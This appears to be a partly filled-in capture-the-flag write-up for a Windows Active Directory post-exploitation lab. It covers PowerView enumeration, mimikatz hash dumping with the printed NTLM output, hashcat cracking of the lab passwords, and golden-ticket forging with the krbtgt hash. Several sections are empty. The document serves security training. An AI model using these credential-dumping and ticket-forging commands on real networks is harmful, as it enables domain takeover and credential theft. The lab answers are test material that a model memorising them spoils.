
## Post Exploitation Basics

```
Username: Administrator
Password: P@$$W0rd
Domain Name: Controller
```
#### Enumerations with Powerview

Cheat sheet with Powerview commands: 
https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
https://powersploit.readthedocs.io/en/latest/Recon/

SSH into the Vulnerable Machine
```
ssh Administrator@10.10.
Password: P@$$W0rd
```

What is the shared folder that is not set by default?
```
Invoke-ShareFinder

Share
```

What operating system is running inside of the network besides Windows Server 2019?
```
Get-NetComputer -fulldata | select operatingsystem 

Windows 10 Enterprise Evaluation
```

I've hidden a flag inside of the users find it
```

```
#### Enumeration with Bloodhound

#### Dumping Hashes with mimikatz

Run mimikatz
```
mimikatz
```

Confirm that mimikatz is being run as an Administrator
```
privilege::debug
```

Dump the hashes with mimikatz
```
lsadump::lsa /patch

RID  : 000001f4 (500)  
User : Administrator  
LM   :  
NTLM : 2777b7fec870e04dda00cd7260f7bee6  
  
RID  : 000001f5 (501)  
User : Guest  
LM   :  
NTLM :  
  
RID  : 000001f6 (502)  
User : krbtgt    
LM   :  
NTLM : 5508500012cc005cf7082a9a89ebdfdf  
   
RID  : 0000044f (1103)  
User : Machine1  
LM   :  
NTLM : 64f12cddaa88057e06a81b54e73b949b  
  
RID  : 00000451 (1105)  
User : Admin2  
LM   :  
NTLM : 2b576acbe6bcfda7294d6bd18041b8fe  
  
RID  : 00000452 (1106)  
User : Machine2  
LM   :  
NTLM : c39f2beb3d2ec06a62cb887fb391dee0  
  
RID  : 00000453 (1107)    
User : SQLService  
LM   :  
NTLM : f4ab68f27303bcb4024650d8fc5f973a  
  
RID  : 00000454 (1108)  
User : POST  
LM   :  
NTLM : c4b0e1b10c7ce2c4723b4e2407ef81a2  
  
RID  : 00000457 (1111)  
User : sshd  
LM   :  
NTLM : 2777b7fec870e04dda00cd7260f7bee6  
  
RID  : 000003e8 (1000)  
User : DOMAIN-CONTROLL$  
LM   :  
NTLM : 2856f6788008913b2f331e7a547e13e4    
  
RID  : 00000455 (1109)  
User : DESKTOP-2$  
LM   :  
NTLM : 3c2d4759eb9884d7a935fe71a8e0f54c  
  
RID  : 00000456 (1110)  
User : DESKTOP-1$  
LM   :  
NTLM : 7d33346eeb11a4f12a6c201faaa0d89a
```

```
DESKTOP-1$
hashcat -m 1000 7d33346eeb11a4f12a6c201faaa0d89a rockyou.txt
12345 > hockey 


```

**Questions**

what is the Machine1 Password?
```
hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b rockyou.txt

64f12cddaa88057e06a81b54e73b949b:Password1
```

What is the Machine2 Hash?
```
└─# hashcat -m 1000 c39f2beb3d2ec06a62cb887fb391dee0 rockyou.txt

c39f2beb3d2ec06a62cb887fb391dee0:Password2
```
#### Golden Ticket Attacks with mimikatz

```
`mimikatz.exe`
```


```
lsadump::lsa /inject /name:krbtgt

Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166

RID  : 000001f6 (502)  
User : krbtgt

NTLM : 5508500012cc005cf7082a9a89ebdfdf
```

Create a golden ticket with the information gathered from the inject command 
```
kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
```
**Questions**

I understand how a golden ticket attack works and how to use a golden ticket attack to move through a network
```

```

#### Enumeration with Server Manager

What tool allows to view the event logs?
```

```

What is the SQL Service password
```

```
#### Maintaining Access

#### Conclusion


